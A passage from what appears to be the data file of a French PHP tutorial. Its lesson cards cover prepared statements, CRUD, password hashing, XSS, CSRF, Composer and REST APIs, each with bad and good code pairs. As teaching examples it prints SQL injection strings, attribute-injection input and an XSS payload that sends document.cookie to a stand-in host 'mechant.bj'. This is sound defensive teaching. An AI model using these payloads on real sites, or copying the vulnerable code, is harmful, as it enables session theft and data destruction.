            { t: 'code', lang: 'php', code:
'// CE QU\'IL NE FAUT JAMAIS ÉCRIRE :\n$ville = $_GET["ville"];\n$sql = "SELECT * FROM clients WHERE ville = \'" . $ville . "\'";\n// ville saisie : Cotonou\' OR \'1\'=\'1\n// SQL final : WHERE ville = \'Cotonou\' OR \'1\'=\'1\'  → TOUTE la table !\n// variantes : \'; DROP TABLE clients; --   · login sans mot de passe…' },
            { t: 'h3', h: 'prepare + execute : la forteresse' },
            { t: 'code', lang: 'php', code:
'// 1. La requête part SEULE, avec des marqueurs\n$stmt = $pdo->prepare("SELECT * FROM clients WHERE ville = :ville");\n\n// 2. Les données partent APRÈS, clairement étiquetées "données"\n$stmt->execute(["ville" => $_GET["ville"] ?? ""]);\n\n$clients = $stmt->fetchAll();\n\n// Forme raccourcie pour les simples :\n$stmt = $pdo->prepare("SELECT * FROM produits WHERE prix < ?");\n$stmt->execute([$prix_max]);           // marqueur positionnel ?' },
            { t: 'callout', kind: 'tip', h: 'Préfère les **marqueurs nommés** (`:ville`) aux positionnels dès qu\'il y en a plus d\'un : le tableau associatif d\'execute rend l\'ordre sans importance et la relecture immédiate.' },
            { t: 'h3', h: 'Les cas limites à connaître' },
            { t: 'code', lang: 'php', code:
'// LIKE : les jokers % restent des données → dans la VALEUR\n$stmt = $pdo->prepare("SELECT * FROM produits WHERE nom LIKE :q");\n$stmt->execute(["q" => "%" . ($_GET["q"] ?? "") . "%"]);\n\n// LIMIT/OFFSET ne se lient pas → caster (validation numérique)\n$par_page = 20;\n$page = max(1, (int) ($_GET["page"] ?? 1));\n$sql = "SELECT * FROM produits LIMIT " . $par_page\n     . " OFFSET " . (($page - 1) * $par_page);\n\n// WHERE IN (…) : autant de marqueurs que d\'éléments\n$ids   = [3, 7, 12];\n$trous = implode(",", array_fill(0, count($ids), "?"));\n$stmt  = $pdo->prepare("SELECT * FROM produits WHERE id IN ($trous)");\n$stmt->execute($ids);\n\n// Nom de colonne de tri : LISTE BLANCHE (jamais lié !)\n$tri = in_array($_GET["tri"] ?? "", ["nom", "prix"], true) ? $_GET["tri"] : "nom";' },
            { t: 'callout', kind: 'warn', h: 'Les requêtes préparées protègent les **données**, pas les **identifiants SQL** : noms de tables, de colonnes, ordres de tri ne peuvent pas être liés. Pour ceux-là : liste blanche, uniquement. Et `addslashes()` n\'est PAS une protection (encodages, multibyte) — à ranger au musée.' }
          ],
          errors: [
            { title: 'Concaténer la saisie dans le SQL', lang: 'php', bad:
'$stmt = $pdo->query("DELETE FROM commandes WHERE id = " . $_GET["id"]);\n// id = 1 OR 1=1 → toutes les commandes supprimées', good:
'$stmt = $pdo->prepare("DELETE FROM commandes WHERE id = ?");\n$stmt->execute([(int) $_GET["id"]]);', why: 'Toute donnée interpolée dans le SQL est évaluée comme du CODE SQL par le serveur. La requête préparée verrouille la structure AVANT l\'arrivée des données : chiffres, quotes et tirets saisis ne sont plus que du texte.' },
            { title: 'Exception PDO affichée au client', lang: 'php', bad:
'} catch (PDOException $e) {\n    echo $e->getMessage();   // révèle requête, schéma, serveur…\n}', good:
'} catch (PDOException $e) {\n    error_log($e);                      // détails → log serveur\n    http_response_code(500);\n    echo "Service momentanément indisponible.";\n}', why: 'Un message SQL exact (table, colonne, syntaxe) est une cartographie offerte à l\'attaquant pour raffiner ses injections. Le détail appartient au journal ; l\'usager mérite une phrase neutre.' }
          ],
          related: ['php-pdo', 'php-crud', 'php-validation', 'lv-eloquent']
        },

        {
          id: 'php-crud',
          title: 'CRUD complet avec PDO',
          icon: 'post_add',
          level: 'Intermédiaire',
          tagline: 'Créer, Lire, Mettre à jour, Supprimer : la machine complète, du formulaire à la base, sans une seule requête concaténée.',
          intro: 'CRUD = Create, Read, Update, Delete : le squelette de 90 % des applications web (catalogue, blog, boutique). Voyons la machine complète sur un cas réel — les produits d\'une échoppe de Dantokpa — avec pour chaque opération : la **requête préparée**, la **lecture du résultat**, et le **petit piège** qui l\'accompagne.',
          blocks: [
            { t: 'h3', h: 'Le décor' },
            { t: 'code', lang: 'sql', code:
'CREATE TABLE produits (\n  id     INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,\n  nom    VARCHAR(120) NOT NULL,\n  prix   INT UNSIGNED NOT NULL,          -- en FCFA, entier !\n  stock  INT UNSIGNED NOT NULL DEFAULT 0\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;' },
            { t: 'h3', h: 'C — Create : INSERT + lastInsertId' },
            { t: 'code', lang: 'php', code:
'$stmt = $pdo->prepare(\n    "INSERT INTO produits (nom, prix, stock) VALUES (:nom, :prix, :stock)"\n);\n$stmt->execute([\n    "nom"   => $nom_valide,\n    "prix"  => $prix_valide,\n    "stock" => $stock_valide,\n]);                                     // execute() → bool de succès\n$nouvel_id = $pdo->lastInsertId();      // l\'ID auto-incrémenté créé' },
            { t: 'h3', h: 'R — Read : une ligne, toutes les lignes' },
            { t: 'code', lang: 'php', code:
'// UNE ligne (fetch = suivante ou false)\n$stmt = $pdo->prepare("SELECT * FROM produits WHERE id = ?");\n$stmt->execute([$id]);\n$produit = $stmt->fetch();               // tableau associatif ou false\nif (!$produit) { /* 404 */ }\n\n// TOUTES les lignes\n$produits = $pdo->query(\n    "SELECT id, nom, prix, stock FROM produits ORDER BY nom"\n)->fetchAll();' },
            { t: 'h3', h: 'U — Update : avec WHERE, TOUJOURS' },
            { t: 'code', lang: 'php', code:
'$stmt = $pdo->prepare(\n    "UPDATE produits SET prix = :prix, stock = :stock WHERE id = :id"\n);\n$stmt->execute(["prix" => 550, "stock" => 8, "id" => $id]);\necho $stmt->rowCount();   // lignes RÉELLEMENT modifiées (0 si idem/absent)' },
            { t: 'h3', h: 'D — Delete : mesuré et vérifié' },
            { t: 'code', lang: 'php', code:
'$stmt = $pdo->prepare("DELETE FROM produits WHERE id = ?");\n$stmt->execute([$id]);\nif ($stmt->rowCount() === 0) {\n    // id inexistant : décider du message (ou du statut 404 en API)\n}' },
            { t: 'h3', h: 'Bonus pro : la transaction' },
            { t: 'code', lang: 'php', code:
'try {\n    $pdo->beginTransaction();\n    // 1. débiter le stock du produit\n    $pdo->prepare("UPDATE produits SET stock = stock - ? WHERE id = ?")\n        ->execute([$qte, $id_produit]);\n    // 2. enregistrer la commande\n    $pdo->prepare("INSERT INTO commandes (produit_id, qte) VALUES (?, ?)")\n        ->execute([$id_produit, $qte]);\n    $pdo->commit();                     // TOUT réussit ensemble\n} catch (Throwable $e) {\n    $pdo->rollBack();                   // …ou rien ne se passe\n    throw $e;\n}' },
            { t: 'callout', kind: 'tip', h: 'Pense « requêtes préparées PARTOUT », y compris les DELETE/UPDATE : un `id` vient toujours de l\'extérieur. Et la transaction n\'est pas du luxe : dès que DEUX écritures dépendent l\'une de l\'autre (stock + commande), c\'est le seul moyen d\'éviter un stock vendu sans commande — ou l\'inverse.' }
          ],
          errors: [
            { title: 'UPDATE/DELETE sans WHERE', lang: 'php', bad:
'$pdo->exec("UPDATE produits SET prix = 0");        // TOUT à 0 FCFA\n$pdo->exec("DELETE FROM produits WHERE id = " . $id_etait_vide);  // ☠', good:
'// WHERE toujours présent, paramétré, et vérifie rowCount() ;\n// en doute : beginTransaction() + SELECT de contrôle AVANT commit.', why: 'Une clause WHERE oubliée ou rendue inopérante (variable vide concaténée) transforme la requête en table rase. Pas de Ctrl+Z en SQL : seules sauvegardes et transactions limitent la casse.' },
            { title: 'SELECT * « au cas où »', lang: 'php', bad:
'$produits = $pdo->query("SELECT * FROM produits")->fetchAll();\n// → colonnes inutiles transportées, schéma couplé partout', good:
'$produits = $pdo->query(\n    "SELECT id, nom, prix FROM produits ORDER BY nom")->fetchAll();', why: 'SELECT * ramène chaque fois toutes les colonnes (dont les futures — photo binaire, notes internes) et désindexe certaines optimisations. Nommer les colonnes documente la requête et la sécurise.' }
          ],
          related: ['php-requetes-preparees', 'php-pdo', 'php-validation', 'lv-eloquent']
        }
      ]
    },

    /* 13. SÉCURITÉ */
    {
      id: 'securite',
      name: 'Sécurité',
      icon: 'security',
      fiches: [
        {
          id: 'php-mots-de-passe',
          title: 'Mots de passe : password_hash',
          icon: 'password',
          level: 'Intermédiaire',
          tagline: 'Jamais en clair, jamais en md5 : le couple password_hash / password_verify, le sel automatique, et le rehash.',
          intro: 'On ne **stocke pas** les mots de passe des utilisateurs : on stocke une empreinte invérifiable en sens inverse. PHP fournit cette machine avec **`password_hash`** (bcrypt, sel aléatoire intégré) et **`password_verify`** (comparaison en temps constant). Depuis PHP 5.5, il n\'existe **aucune bonne raison** d\'y déroger — ni md5, ni sha1, ni « chiffrement maison ».',
          blocks: [
            { t: 'h3', h: 'Inscription : hacher' },
            { t: 'code', lang: 'php', code:
'// À l\'inscription :\n$hash = password_hash($_POST["mdp"], PASSWORD_DEFAULT);\n// → $2y$10$N9qo8uLOickgx2ZMRZoMye…  (algo + coût + SEL + empreinte, tout en un)\n\n$stmt = $pdo->prepare("INSERT INTO users (email, mdp_hash) VALUES (?, ?)");\n$stmt->execute([$email_valide, $hash]);\n// ⚠ colonne VARCHAR(255) : la chaîne fait ~60 caractères ET GRANDIRA\n// avec les futurs algorithmes par défaut.' },
            { t: 'h3', h: 'Connexion : vérifier' },
            { t: 'code', lang: 'php', code:
'// À la connexion :\n$stmt = $pdo->prepare("SELECT id, mdp_hash FROM users WHERE email = ?");\n$stmt->execute([$email]);\n$user = $stmt->fetch();\n\n// password_verify retrouve sel et coût DANS le hash stocké\nif ($user && password_verify($_POST["mdp"], $user["mdp_hash"])) {\n    session_regenerate_id(true);              // (fiche Sessions)\n    $_SESSION["user_id"] = $user["id"];\n    header("Location: /compte.php");\n    exit;\n}\n// Message IDENTIQUE que l\'email soit inconnu ou le mdp faux :\n$erreur = "Identifiants incorrects.";' },
            { t: 'h3', h: 'Futur-proof : password_needs_rehash' },
            { t: 'code', lang: 'php', code:
'// Juste après une connexion réussie — migration douce d\'algorithme :\nif (password_needs_rehash($user["mdp_hash"], PASSWORD_DEFAULT)) {\n    $nouveau = password_hash($_POST["mdp"], PASSWORD_DEFAULT);\n    $pdo->prepare("UPDATE users SET mdp_hash = ? WHERE id = ?")\n        ->execute([$nouveau, $user["id"]]);\n}' },
            { t: 'callout', kind: 'info', h: 'Pourquoi bcrypt et pas SHA-256 ? Les hash **rapides** (md5, sha1, sha256) se testent à des milliards d\'essais/seconde sur GPU — parfait pour la force brute. bcrypt est **lent par construction**, avec un facteur de coût réglable (`["cost" => 12]`), et le sel tue les tables pré-calculées (rainbow tables).' },
            { t: 'table', head: ['Idée', 'Verdict'], rows: [
              ['stocker en clair', '☠ fuite BDD = tous les comptes pillés'],
              ['md5 / sha1', '☠ cassé en quelques secondes par GPU'],
              ['mdp + sel maison', '⚠ réinventer la cryptographie, raté garanti'],
              ['chiffrer (réversible)', '⚠ qui garde la clé ? la fuite révèle tout'],
              ['password_hash', '✓ lent + sel auto + rehash — la voie']
            ] }
          ],
          errors: [
            { title: 'Stocker le mot de passe en clair', lang: 'php', bad:
'$stmt->execute([$email, $_POST["mdp"]]);   // colonne mdp en clair', good:
'$hash = password_hash($_POST["mdp"], PASSWORD_DEFAULT);\n$stmt->execute([$email, $hash]);', why: 'Toute base finit par fuiter (backup égaré, injection, stagiaire). En clair, chaque utilisateur perd tous ses comptes où il réutilise son mot de passe — et tu en portes la responsabilité. C\'est exactement pour ça que l\'empreinte existe.' },
            { title: 'Comparer les hash avec ==', lang: 'php', bad:
'if (hash("sha256", $_POST["mdp"]) === $user["mdp_hash"]) { }', good:
'if (password_verify($_POST["mdp"], $user["mdp_hash"])) { }', why: '==/=== s\'arrêtent au premier octet différent : un attaquant chronomètre les réponses et reconstruit l\'empreinte caractère par caractère (timing attack). password_verify compare en TEMPS CONSTANT — et gère sel et algorithme pour toi.' }
          ],
          related: ['php-sessions', 'php-validation', 'php-csrf', 'lv-authentification']
        },

        {
          id: 'php-xss',
          title: 'XSS : échapper avec htmlspecialchars',
          icon: 'shield',
          level: 'Intermédiaire',
          tagline: 'Tout affichage de donnée externe passe par htmlspecialchars : END the « echo $_GET » era, par contexte de sortie.',
          intro: 'La **XSS** (Cross-Site Scripting) : une donnée utilisateur affichée brute devient du **code exécuté** dans le navigateur des autres — vol de cookies, de sessions, actions à leur place. La parade centrale en PHP : **`htmlspecialchars` à l\'AFFICHAGE**, adaptée au contexte (texte HTML, attribut, JS, URL). Ni plus tôt, ni plus tard.',
          blocks: [
            { t: 'h3', h: 'L\'attaque, pour comprendre' },
            { t: 'code', lang: 'php', code:
'// Le livre d\'or naïf :\n$avis = $_POST["avis"];           // saisi par un visiteur\necho "<p>$avis</p>";\n\n// Un « joli » avis saisi :\n// <script>fetch("https://mechant.bj/vol?c=" + document.cookie)\n// → exécuté chez CHAQUE visiteur qui lit la page !\n// (même <img src=x onerror=…> marche sans aucune balise script)' },
            { t: 'h3', h: 'La parade centrale' },
            { t: 'code', lang: 'php', code:
'// Echapper À L\'AFFICHAGE, en citant le charset et ENT_QUOTES :\necho "<p>" . htmlspecialchars($avis, ENT_QUOTES, "UTF-8") . "</p>";\n// < devient &lt; > devient &gt; " et \' deviennent des entités\n// → le texte reste du TEXTE, jamais du code' },
            { t: 'callout', kind: 'tip', h: 'Marre de la verbosité ? Deux réflexes pérennes : ① une petite fonction `e($s)` enveloppant htmlspecialchars à utiliser PARTOUT (`<?= e($avis) ?>`) ; ② à terme, un moteur de templates qui échappe par défaut — c\'est l\'une des qualités de Blade côté Laravel.' },
            { t: 'h3', h: 'L\'échappement est CONTEXTE-dépendant' },
            { t: 'table', head: ['Contexte', 'Protection'], rows: [
              ['texte HTML', '`htmlspecialchars($s, ENT_QUOTES, "UTF-8")`'],
              ['attribut HTML', 'même fonction + TOUJOURS entre guillemets'],
              ['URL', '`urlencode($s)` (ou http_build_query)'],
              ['dans du JS', 'injecter via `json_encode($s)` — jamais en concat'],
              ['dans du SQL', 'requêtes préparées (fiche PDO), autre planète !']
            ] },
            { t: 'code', lang: 'php', code:
'// Attribut : les quotes SONT la sécurité (sans elles, espace = nouvel attr !)\necho "<input value=\"" . htmlspecialchars($valeur, ENT_QUOTES, "UTF-8") . "\">";\n\n// URL :\necho "<a href=\"/recherche.php?q=" . urlencode($mot) . "\">";\n\n// Donnée vers JS : json_encode pose les quotes ET échappe proprement\necho "<script>const ville = " . json_encode($ville) . ";";' },
            { t: 'h3', h: 'Défenses en profondeur' },
            { t: 'ul', items: [
              '`strip_tags($s)` si le but est « aucun HTML du tout » (mais pas pour les attributs !).',
              'Content-Security-Policy en en-tête : le navigateur n\'exécute que tes scripts déclarés.',
              'Cookies HttpOnly (fiche Cookies) : même si une XSS passe, l\'ID de session reste hors de portée du JS.',
              'Stocke la donnée BRUTE en base ; l\'échappement au stockage = double encodage assuré (fiche Validation).'
            ] }
          ],
          errors: [
            { title: 'echo direct d\'une donnée utilisateur', lang: 'php', bad:
'echo "<h1>Bonjour " . $_GET["nom"] . "</h1>";\necho $avis;', good:
'echo "<h1>Bonjour " . htmlspecialchars($_GET["nom"] ?? "", ENT_QUOTES, "UTF-8") . "</h1>";\necho htmlspecialchars($avis, ENT_QUOTES, "UTF-8");', why: 'echo ne sait pas faire la différence entre texte et balises : tout ce qui passe part tel quel, interprété par le navigateur. htmlspecialchars neutralise les chevaux de Troie en rendant les délimiteurs inertes — c\'est LE réflexe PHP n°1.' },
            { title: 'strip_tags comme solution universelle', lang: 'php', bad:
'echo "<input value=\'" . strip_tags($_POST["pseudo"]) . "\'>";\n// saisie : \' onfocus=alert(1) autofocus x=\'  → aucune balise, XSS quand même', good:
'echo "<input value=\"" . htmlspecialchars($_POST["pseudo"] ?? "", ENT_QUOTES, "UTF-8") . "\">";', why: 'strip_tags ne retire que les balises ; hors contexte « texte HTML » (attributs, JS), il reste les armes (guillemets, espaces). Seul l\'échappement adapté au contexte protège partout : ENT_QUOTES inclus.' }
          ],
          related: ['php-validation', 'php-formulaires', 'php-mots-de-passe', 'lv-blade']
        },

        {
          id: 'php-csrf',
          title: 'CSRF : le jeton de confiance',
          icon: 'token',
          level: 'Avancé',
          tagline: 'Un formulaire peut venir d\'un autre site : le jeton aléatoire en session + hash_equals ferme la porte.',
          intro: 'Scénario : tu es connecté à ta boutique. Un autre onglet affiche un site piégé qui soumet **en cachette** un formulaire POST vers /supprimer — ton navigateur joint **automatiquement tes cookies**, et le serveur y voit… toi. C\'est la **CSRF** (Cross-Site Request Forgery). La parade : exiger un **secret présent dans le formulaire** qu\'un site tiers ne peut pas connaître ni lire — le jeton CSRF.',
          blocks: [
            { t: 'h3', h: 'Générer et afficher le jeton' },
            { t: 'code', lang: 'php', code:
'session_start();\n\n// Une fois par session (régénérable) :\nif (empty($_SESSION["csrf"])) {\n    $_SESSION["csrf"] = bin2hex(random_bytes(32));\n}\n?>\n<form method="post" action="/profil/supprimer">\n  <!-- le secret voyage DANS le formulaire, invisible -->\n  <input type="hidden" name="csrf" value="<?= $_SESSION["csrf"] ?>">\n  <button>Supprimer mon compte</button>\n</form>' },
            { t: 'h3', h: 'Vérifier AVANT d\'agir — avec hash_equals' },
            { t: 'code', lang: 'php', code:
'if ($_SERVER["REQUEST_METHOD"] === "POST") {\n    $recu = $_POST["csrf"] ?? "";\n\n    // hash_equals : comparaison en TEMPS CONSTANT (anti-timing)\n    if (!hash_equals($_SESSION["csrf"] ?? "", $recu)) {\n        http_response_code(403);\n        exit("Jeton invalide : requête refusée.");\n    }\n    // …action sensible enfin autorisée…\n}' },
            { t: 'callout', kind: 'warn', h: 'La vérification vient **avant toute écriture** — jamais après. Et `==` proscrit : sa comparaison s\'arrête au premier octet différent, ouvrant une mesure de timing. `hash_equals` compare en durée constante.' },
            { t: 'h3', h: 'SameSite : la ceinture moderne' },
            { t: 'code', lang: 'php', code:
'// Le cookie de session avec SameSite=Lax (ou Strict) n\'est PAS\n// joint aux requêtes POST cross-site : la plupart des CSRF meurent là.\nini_set("session.cookie_samesite", "Lax");\n\n// Lax = navigation de premier niveau autorisée (clic sur lien GET),\n// Strict = aucun envoi cross-site (peut casser des liens entrants).' },
            { t: 'h3', h: 'Pare-feu complet d\'une action sensible' },
            { t: 'ol', items: [
              'Méthode **POST** uniquement (jamais GET pour écrire — fiche Formulaires)',
              'Jeton CSRF vérifié avec `hash_equals`, avant l\'action',
              'Cookies de session en `SameSite=Lax/Strict` + HttpOnly',
              'Bonus admin : `Referer`/`Origin` cohérents (indice, pas preuve)',
              'Les frameworks (Laravel) automatisent ça via middleware (`@csrf` dans Blade)'
            ] },
            { t: 'p', h: 'Cas des **API JSON** : si l\'API n\'utilise **pas de cookie** d\'authentification (jeton Bearer lu par le JS, jamais envoyé automatiquement), la CSRF ne s\'applique simplement pas — le pré-requis de l\'attaque (l\'envoi automatique des cookies) a disparu.' }
          ],
          errors: [
            { title: 'Vérifier le jeton après l\'action — ou jamais', lang: 'php', bad:
'if ($_SERVER["REQUEST_METHOD"] === "POST") {\n    supprimer_compte($user_id);            // déjà fait…\n    if (!hash_equals($csrf_attendu, $csrf)) { exit("refusé"); }\n}', good:
'if ($_SERVER["REQUEST_METHOD"] === "POST") {\n    if (!hash_equals($_SESSION["csrf"] ?? "", $_POST["csrf"] ?? "")) {\n        http_response_code(403);\n        exit("Jeton invalide.");\n    }\n    supprimer_compte($user_id);           // action APRES le contrôle\n}', why: 'La CSRF se joue EXACTEMENT avant l\'effet de bord : une vérification post-action est un garde qui fouille après le cambriolage. L\'ordre est : méthode → jeton → action.' },
            { title: 'Un secret prévisible ou dans l\'URL', lang: 'php', bad:
'$_SESSION["csrf"] = md5("boutique" . $user_id);   // déductible !\n// ou : <form action="/suppr?csrf=abc">             → logs, historique…', good:
'$_SESSION["csrf"] = bin2hex(random_bytes(32));   // 256 bits aléatoires\n// hidden input dans le CORPS du formulaire, POST', why: 'random_bytes puise dans l\'aléa cryptographique du système ; md5 d\'une donnée connue se devine. Et un jeton dans l\'URL finit dans les logs serveur, l\'historique, le Referer — autant dire publié.' }
          ],
          related: ['php-formulaires', 'php-sessions', 'php-xss', 'php-mots-de-passe']
        }
      ]
    },

    /* 14. COMPOSER & DÉPENDANCES */
    {
      id: 'composer',
      name: 'Composer & dépendances',
      icon: 'extension',
      fiches: [
        {
          id: 'php-composer',
          title: 'Composer, composer.json & PSR-4',
          icon: 'extension',
          level: 'Intermédiaire',
          tagline: 'Le gestionnaire de dépendances de PHP : require, lock, vendor/ à ne pas committer, et l\'autoload qui tue les require.',
          intro: '**Composer** fait pour PHP ce que npm fait pour JavaScript : déclarer les bibliothèques du projet (`composer.json`), les télécharger (`vendor/`), figer les versions (`composer.lock`) — et charger les classes **automatiquement** grâce au standard PSR-4. C\'est la porte d\'entrée de tout l\'écosystème moderne : Laravel, Symfony, PHPUnit…',
          blocks: [
            { t: 'h3', h: 'Installation & premier require' },
            { t: 'code', lang: 'bash', code:
'# Installation (Linux/Mac) — voir getcomposer.org pour Windows\nphp -r "copy(\'https://getcomposer.org/installer\', \'composer-setup.php\');"\nphp composer-setup.php\nsudo mv composer.phar /usr/local/bin/composer\ncomposer --version        # Composer version 2.…\n\n# Nouveau projet :\ncomposer init             # questionnaire → composer.json\n\n# Ajouter une bibliothèque (ex. un client HTTP) :\ncomposer require guzzlehttp/guzzle\n# → composer.json mis à jour · composer.lock créé · vendor/ rempli' },
            { t: 'h3', h: 'composer.json : la carte d\'identité du projet' },
            { t: 'code', lang: 'js', label: 'composer.json', code:
'{\n    "name": "awa/boutique-dantokpa",\n    "description": "Catalogue de marché en PHP natif",\n    "require": {\n        "php": ">=8.2",\n        "guzzlehttp/guzzle": "^7.8"\n    },\n    "autoload": {\n        "psr-4": {\n            "App\\\\": "src/"\n        }\n    }\n}' },
            { t: 'callout', kind: 'tip', h: '`^7.8` = « compatible 7.x, sans cassure » (≥ 7.8, < 8.0). `composer.lock` fige les versions EXACTES installées : on le **commite**, pour que chaque machine (ton binôme, la prod) exécute le même code au bit près.' },
            { t: 'h3', h: 'PSR-4 : adieu les require' },
            { t: 'p', h: 'Le standard PSR-4 lie un **namespace** à un **dossier** : `App\` ↔ `src/`. Dès lors, `new App\Boutique\Panier()` fait charger automatiquement `src/Boutique/Panier.php` — la fin des longues listes d\'include (fiche Namespaces pour les règles).' },
            { t: 'code', lang: 'php', label: 'public/index.php', code:
'<?php\nrequire __DIR__ . "/../vendor/autoload.php";   // LA seule inclusion écrite\n\nuse App\Boutique\Panier;\nuse GuzzleHttp\Client;\n\n$panier = new Panier();       // src/Boutique/Panier.php chargé tout seul ✓\n$http   = new Client();       // idem, depuis vendor/guzzlehttp/' },
            { t: 'h3', h: 'Le quotidien : commandes' },
            { t: 'table', head: ['Commande', 'Rôle'], rows: [
              ['`composer install`', 'installe EXACTEMENT le lock (prod, CI)'],
              ['`composer update`', 'recalcule selon les contraintes du json'],
              ['`composer require vendor/pkg`', 'ajoute une dépendance'],
              ['`composer remove vendor/pkg`', 'retire proprement'],
              ['`composer dump-autoload`', 'régénère l\'autoloader (nouvelle classe)'],
              ['`composer audit`', 'failles connues dans tes dépendances']
            ] },
            { t: 'callout', kind: 'warn', h: '`vendor/` **ne se versionne pas** (.gitignore !) : il est reconstruit partout avec `composer install`. Ajoute-le au `.gitignore` dès le premier jour, avec `.env` et autres secrets.' }
          ],
          errors: [
            { title: 'Committer vendor/', lang: 'php', bad:
'git add .                    # +15 000 fichiers de dépendances…', good:
'# .gitignore\n/vendor/\n.env\ncomposer.lock    # ✓ on COMMITE (versions figées reproductibles)', why: 'vendor/ est un ARTEFACT reproductible à partir de composer.lock : le committer double la taille du dépôt, fige des copies introuvables à jour et noie les revues. L\'équipe et la CI reconstruisent avec composer install.' },
            { title: 'Éditer composer.json puis de l\'oublier', lang: 'php', bad:
'# ajout à la main dans "require", puis… rien\n# vendor/ et le lock ne correspondent plus au json', good:
'composer update vendor/pkg     # ou composer require, qui fait tout\n# json + lock + vendor/ restent cohérents, toujours', why: 'composer.json exprime ton INTENTION (compatible 7.x) ; composer.lock et vendor/ en sont la réalisation figée. Passer à côté des commandes crée un trio désynchronisé — le déploiement installerait autre chose que tes tests.' }
          ],
          related: ['php-namespaces', 'php-inclusion', 'php-api-rest', 'lv-fondamentaux']
        }
      ]
    },

    /* 15. API REST */
    {
      id: 'api',
      name: 'API REST',
      icon: 'api',
      fiches: [
        {
          id: 'php-api-rest',
          title: 'API REST en PHP natif',
          icon: 'api',
          level: 'Intermédiaire',
          tagline: 'header JSON, json_encode/decode, méthodes HTTP, codes de statut — un petit routeur REST propre, sans framework.',
          intro: 'Renvoyer du **JSON** au lieu du HTML transforme ton PHP en service que n\'importe quel front (React, Vue, appli mobile) peut consommer. Une API REST propre repose sur quatre piliers : le **Content-Type** annoncé, le **bon code de statut**, les **méthodes HTTP** qui portent l\'intention (GET/POST/PUT/DELETE), et des réponses homogènes. Voyons la machine complète.',
          blocks: [
            { t: 'h3', h: 'La ressource en deux temps' },
            { t: 'code', lang: 'php', label: 'api/produits.php', code:
'<?php\nheader("Content-Type: application/json; charset=utf-8");\nrequire_once dirname(__DIR__) . "/bootstrap.php";    // $pdo partagé\n\n$methode = $_SERVER["REQUEST_METHOD"];\n$id = isset($_GET["id"]) ? (int) $_GET["id"] : null;\n\ntry {\n    match (true) {\n        $methode === "GET"    && $id   => lire_un($pdo, $id),\n        $methode === "GET"             => lire_tous($pdo),\n        $methode === "POST"            => creer($pdo),\n        $methode === "DELETE" && $id   => supprimer($pdo, $id),\n        default => repondre(405, ["erreur" => "Méthode non autorisée"]),\n    };\n} catch (Throwable $e) {\n    error_log($e);\n    repondre(500, ["erreur" => "Erreur serveur"]);\n}' },
            { t: 'h3', h: 'Les fonctions qui font le travail' },
            { t: 'code', lang: 'php', code:
'function repondre(int $code, array $donnees): void   // LE réflexe : point\n{                                                    // de sortie unique\n    http_response_code($code);\n    echo json_encode($donnees, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);\n    exit;\n}\n\nfunction lire_un(PDO $pdo, int $id): void\n{\n    $stmt = $pdo->prepare("SELECT id, nom, prix, stock FROM produits WHERE id = ?");\n    $stmt->execute([$id]);\n    $produit = $stmt->fetch();\n    $produit\n        ? repondre(200, $produit)\n        : repondre(404, ["erreur" => "Produit introuvable"]);\n}\n\nfunction creer(PDO $pdo): void\n{\n    // Le corps JSON n\'est PAS dans $_POST : il se lit dans php://input\n    $donnees = json_decode(file_get_contents("php://input"), true,\n                           512, JSON_THROW_ON_ERROR);\n    // …validation (fiche dédiée)…\n    $stmt = $pdo->prepare("INSERT INTO produits (nom, prix) VALUES (?, ?)");\n    $stmt->execute([$donnees["nom"], $donnees["prix"]]);\n    repondre(201, ["id" => (int) $pdo->lastInsertId()]);\n}' },
            { t: 'h3', h: 'JSON : les deux options qui sauvent' },
            { t: 'code', lang: 'php', code:
'// UNESCAPED_UNICODE : les accents lisibles ("Abomey-Calavi", pas \\u00e9)\njson_encode($data, JSON_UNESCAPED_UNICODE);\n\n// THROW_ON_ERROR : une erreur de JSON → exception au lieu de null silencieux\njson_decode($json, true, 512, JSON_THROW_ON_ERROR);\n//                                      ↑ true = tableaux associatifs' },
            { t: 'h3', h: 'Les statuts à utiliser' },
            { t: 'table', head: ['Code', 'Quand'], rows: [
              ['`200`', 'GET/PUT/DELETE réussis, avec le corps'],
              ['`201`', 'création réussie (id dans le corps)'],
              ['`400`', 'JSON ou paramètres invalides'],
              ['`404`', 'ressource absente'],
              ['`405`', 'méthode non supportée par la route'],
              ['`422`', 'validation métier échouée (champs détaillés)'],
              ['`500`', 'panne serveur (détails dans le log seulement)']
            ] },
            { t: 'h3', h: '…et côté client ?' },
            { t: 'p', h: 'Ton front consomme cette API avec `fetch` (fiche fetch du module JavaScript — mêmes interfaces REST : méthodes, statuts, JSON). Quand le projet prend du volume (auth, validation massive, routes imbriquées), Laravel structure exactement ces idées — fiche API Resources du module Laravel.' }
          ],
          errors: [
            { title: 'Construire le JSON à la main', lang: 'php', bad:
'echo "{\\"nom\\": \\"" . $produit["nom"] . "\\"}";\n// un guillemet ou { dans le nom → JSON cassé', good:
'echo json_encode($produit, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);', why: 'json_encode gère quotes, accolades, caractères spéciaux et encodage à tous les étages. Un JSON concaténé casse à la première apostrophe d\'un nom de village — et n\'annonce même pas d\'erreur côté client, juste un parsing qui y reste.' },
            { title: 'Toujours 200, même en échec', lang: 'php', bad:
'if (!$produit) { echo json_encode(["erreur" => "introuvable"]); }\n// statut réel : 200 OK — le front affiche « produit chargé »…', good:
'if (!$produit) { repondre(404, ["erreur" => "introuvable"]); }\n// le front branche fiablement sur res.ok / res.status', why: 'Le code HTTP EST le contrat : les clients (fetch, axios, TanStack Query) décident succès/échec dessus, les caches et proxies obéissent aussi. Un échec déguisé en 200 rend le diagnostic aveugle côté consommateurs.' }
          ],
          related: ['js-fetch', 'php-crud', 'php-requetes-preparees', 'lv-api-resources']
        }
      ]
    },

    /* 16. NAMESPACES */
    {
      id: 'namespaces',
      name: 'Namespaces',
      icon: 'hub',
      fiches: [
        {
          id: 'php-namespaces',
          title: 'Namespaces : adieu les collisions',
          icon: 'hub',
          level: 'Intermédiaire',
          tagline: 'namespace, use et alias : des noms courts sans guerre des noms — et le pacte PSR-4 qui charge les fichiers tout seul.',
          intro: 'Dès que ton projet accueille une bibliothèque externe, deux classes s\'appellent forcément `Connection` ou `Client`. Les **espaces de noms** décorent chaque classe du nom de son « quartier » : `App\Boutique\Client` ≠ `GuzzleHttp\Client`. Ajoute le standard **PSR-4** (quartier ↔ dossier) et l\'autoloader de Composer, et les require disparaissent du paysage.',
          blocks: [
            { t: 'h3', h: 'Déclarer, en première ligne' },
